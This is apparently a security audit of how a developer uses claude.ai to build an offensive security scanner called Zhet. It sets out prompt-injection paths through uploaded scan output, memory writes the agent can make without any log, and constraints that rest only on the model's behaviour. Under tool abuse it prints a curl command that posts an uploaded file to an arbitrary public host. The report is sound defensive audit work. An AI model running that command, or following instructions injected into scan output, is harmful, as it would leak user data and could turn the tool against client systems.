## 1. Executive Summary

### What this system is

claude.ai is used as a development assistant for Zhet — a security scanner deployed
on client engagements. The workflow: architecture discussion → code generation →
file upload/analysis → outputs fed into Claude Code sessions which have full local
execution. claude.ai is an **upstream node** in a pipeline that terminates with
production security tooling used on client systems.

### The number that matters

**9 of 15 applicable controls are at L0** — meaning no demonstrable evidence
the control exists. Two L2 grades are structural properties of the platform,
not designed controls. Zero controls are at L3.

This is not unusual for a solo developer using a consumer AI product.
It becomes significant because Zhet is an offensive security tool: its outputs
affect client systems, and its inputs include data from hostile targets.

### Three findings that require attention

**Finding 1 — Unmodeled attack path (Critical × Irreversible × Cross-domain)**
If scan output from a hostile target is uploaded to claude.ai for analysis,
a payload embedded in that output could influence security advice about how
Zhet processes external data. Bad advice → implementation → Zhet attacks
client systems instead of assessing them. This path was not documented anywhere
before this audit.

**Finding 2 — Behavioral-only enforcement on all Zhet-specific constraints**
"Zhet must not attack out-of-scope targets." "No benchmark tuning." "No
vulnerable code in reports." All of these are enforced exclusively by alignment
training — there is no technical control. For a consumer AI product this is
normal. For offensive security tooling deployed to clients, it should be
explicitly acknowledged and risk-accepted by the owner.

**Finding 3 — memory_user_edits without audit trail**
The agent can write to persistent memory that influences all future sessions.
No notification to the user. No log accessible on the consumer plan. A wrong
architectural assumption written to memory propagates silently across all
subsequent development sessions.

### Posture in one sentence

**Operationally mature, control-maturity zero — held together by the owner
being an expert reviewer and the agent being alignment-trained. Neither is
a control.**

## 2. Immediate Actions

Ordered by effort × mission impact. Total time for items 1–3: under one hour.

### Action 1 — Policy document (20 min) ★ Do today

Create `docs/ai-workflow-policy.md` in the Zhet repo:

```markdown
# AI Workflow Policy — Zhet

## claude.ai usage rules

### PROHIBITED inputs (never upload to claude.ai):
- Raw scan output from real engagement targets
- Client data of any kind
- API keys, SSH keys, tokens, credentials
- Any file containing PII

### ALLOWED inputs:
- Zhet source code for review
- Structured findings (URLs, status codes) — NOT response bodies
- Architecture diagrams, documentation
- Sanitized test data from mock targets (Blackhole)

### Why: claude.ai has full outbound internet access from its sandbox.
### Uploaded files are processed without sanitization.
### Hostile targets can embed injection payloads in response bodies.

## Code from claude.ai

Any code generated by claude.ai and copied to the repo must include:
  # source: claude.ai | YYYY-MM-DD | <topic>

This enables provenance tracking when regressions are investigated.

## Security advice review

Any claude.ai advice about how Zhet processes external input
(response bodies, headers, URLs from targets) requires a second
review before implementation. This is the highest-risk output category.
```

## 3. Threat Model

### Mission definition (owner-provided)

- Zhet finds real vulnerabilities on client engagements; report delivered on time
- New versions do not regress; shipping is confident
- Zhet does not attack client systems instead of assessing them
- Zhet is not tuned to benchmarks — recall on mock ≠ recall on production
- Repository confidentiality and availability preserved
- Secrets and client data do not leak
- Zhet itself contains no vulnerabilities (XSS in reports, RCE, prompt injection
  when processing scan output)

### Mission-critical blast radius matrix

| Agent output type | Mission impact | Recovery | Lateral | Checkpoint required |
|---|---|---|---|---|
| Security advice on Zhet external input handling | **Critical** | **Irreversible** if deployed to client | **Cross-domain** (client systems) | Hard — mandatory second review |
| Architectural recommendation, 300+ lines implemented | Critical | Hours–Days | Adjacent (Claude Code inherits) | Hard — review before implementation |
| Secrets/client data in uploaded file → bash exfiltration | Critical | Irreversible | Cross-domain | Policy — prohibit upload |
| memory_user_edits with wrong architectural assumption | Significant | Hours (find and correct) | Cross-session (all future sessions) | Quarterly memory audit |
| Benchmark tuning advice without guard | Significant | Hours (revert) | Adjacent | CLAUDE.md rule in Claude Code; absent in claude.ai |
| Hotfix, 1–15 lines, leaf file | Marginal | Immediate | None | User review sufficient |

### Threat classes (ASAMM taxonomy)

**C1 — Context injection**

Active vectors in this environment:
- Uploaded Zhet source files processed without sanitization `[empirical]`
- userMemories: agent-writable, cross-session, no user control over auto-capture `[config]`
- bash output from external commands enters context without sanitization `[empirical]`
- Conversation history accumulates; early injected context influences late decisions `[empirical]`

**Zhet-specific C1 path (not documented before this audit):**
Hostile engagement target → crafted HTTP response body → uploaded scan output →
claude.ai context → bad advice on input sanitization → implemented in Zhet →
Zhet attacks client system. Classification: Critical × Irreversible × Cross-domain.

**C2 — Tool abuse**

Empirically verified:
```bash
# Executable without approval from claude.ai sandbox:
curl https://any-public-host.com -d @/mnt/user-data/uploads/uploaded_file
```
`allowed_hosts: *` confirmed in egress proxy JWT. No domain allowlist for public internet. `[empirical]`

memory_user_edits: agent can write persistent state mid-session without
explicit user instruction. No notification. No consumer-plan log. `[empirical]`

Residual after gVisor: user filesystem, SSH keys, git repo — not accessible. `[empirical]`

**C3 — Autonomy window**

Structurally low risk. Every response requires user action to continue.
No /loop, no ScheduleWakeup. `[empirical]`

Edge case: long responses (300+ lines of code) accepted without full review.
Checkpoint exists but may be nominal.

**C4 — Supply chain: claude.ai → Claude Code pipeline**

claude.ai is upstream of Claude Code. Claude Code receives code without
source tagging and treats it as working material. Trust level of claude.ai
outputs in Claude Code: undefined, factually high.

**W1 — Constraint failure**

- "No benchmark tuning" rule: exists in Claude Code CLAUDE.md; absent in claude.ai `[empirical]`
- No programmatic enforcement of any Zhet-specific constraint in claude.ai `[empirical]`
- All Zhet operational constraints are behavioral (will not), not technical (cannot) `[inferred]`

**W2 — Assurance blindspot**

- No structured action log accessible to user `[empirical]`
- No provenance for code generated in claude.ai and committed to repo `[empirical]`
- userMemories auto-capture not visible to user `[config]`
- Anthropic internal logs: 7-day retention, consumer plan — not accessible `[config]`

## 7. Framework Gaps (ASAMM v0.1.0-draft)

> **Note:** All four gaps below were identified during this audit and subsequently
> addressed in ASAMM v0.2.0-draft. Gap 1 → AI-04. Gap 2 → AG-01 v0.2 extension.
> Gap 3 → AI-05. Gap 4 → Part 0 Axiom 6. This section is preserved as a record
> of the discovery process that drove the v0.2 changes.

Three gaps identified during this audit that were not covered
by any ASAMM control at time of audit. All filed and resolved in v0.2.

### Gap 1 — Self-modification control class ✅ Resolved in v0.2 as AI-04

No control addresses agent capability to write to its own persistent context.
Proposed: **AI-04 — Agent Self-Modification Governance**

> Any agent capability to write to its own persistent context (memory, scratch,
> system prompt extension) must be enumerated, classified by blast radius,
> and subject to the same review requirements as external tool invocations
> with equivalent impact.

L1: self-modification surfaces enumerated, user-auditable.
L2: writes logged with provenance; high-blast-radius writes require checkpoint.
L3: automated anomaly detection on self-modification patterns.

### Gap 2 — Dynamic agent graph (Subagent spawning) ✅ Resolved in v0.2 as AG-01 extension

AG-01 assumes a fixed agent registry. Systems with dynamic subagent spawning
(Claude Code Agent tool, Ouroboros) create agents not in any registry at
spawn time.

Proposed addition to AG-01 L2:
> If agents can spawn subagents, the spawning capability itself must be
> classified. Spawned agents inherit parent blast radius but start at F6 trust.
> Parent autonomy classification must include delegation capacity.

### Gap 3 — Operational value constraints as security controls ✅ Resolved in v0.2 as AI-05

ASAMM has no mechanism to express ethical constraints that are simultaneously
security controls. "The scanner must not attack systems outside declared scope"
is C3 (autonomy window exploitation) with a specific blast radius — but ASAMM
provides no control class for documenting and verifying this class of constraint.

Proposed: note in AD-02 or standalone control:
> Operational value constraints (mission boundaries the agent must not cross)
> should be mapped to threat classes and blast radius, and verified through
> behavioral testing (AV-01/AV-02) with the same rigor as technical controls.

### Gap 4 — Evidence primacy axiom ✅ Resolved in v0.2 as Part 0 Axiom 6

ASAMM's evidence column specifies what proves a control is real, but the
foundational principle — that derived claims require primary evidence before
action — is not stated as a first-class axiom in part0-foundations.

Proposed axiom for part0:
> **Evidence primacy:** a claim about system state — from an agent, a tool,
> an audit report, or a human reviewer — is a hypothesis until verified against
> primary evidence. The verification cost must be paid before acting on the claim.
> Authority of the source does not substitute for evidence.

## 8. Audit Methodology — What We Learned

This audit developed and applied several principles not present in the
original ASAMM data collection prompt. Relevant for future audits.

**Principle 1: Mission-centric questions first**
Blast radius is meaningless without mission definition. Three questions
must precede any technical inventory:
1. What is mission success?
2. What outputs, if wrong, make mission completion impossible?
3. What can the owner not afford to lose?

**Principle 2: Evidence source tagging**
Every fact must carry a reliability tag: [empirical] / [config] / [inferred] / [unknown].
[inferred] facts about an agent's own values or constraints have a structural
reliability ceiling — a misaligned agent produces identical self-reports.

**Principle 3: Shared responsibility framing**
For cloud-hosted agents, the control matrix is split between vendor and user.
Black-box testing (empirical) + vendor attestation (SOC2/ISO) is the appropriate
methodology — not "we can't audit this."

**Principle 4: Diagnostic blast radius**
Not just action blast radius — also diagnostic blast radius. A broad diagnostic
claim acted upon without primary evidence verification has its own blast radius:
wrong interventions on wrong failure surfaces. (See Sprint K' postmortem.)

**Principle 5: Self-modification is a distinct control surface**
Memory writes, scratch space, and system prompt modifications by the agent
are not covered by tool registry or execution boundary controls. They require
a separate enumeration with cross-session blast radius assessment.

**Principle 6: Behavioral vs technical enforcement distinction**
For every constraint, explicitly state: is this "cannot" (technical) or "will not"
(behavioral)? For offensive security tooling, behavioral-only constraints on
mission-critical boundaries require explicit risk acceptance.
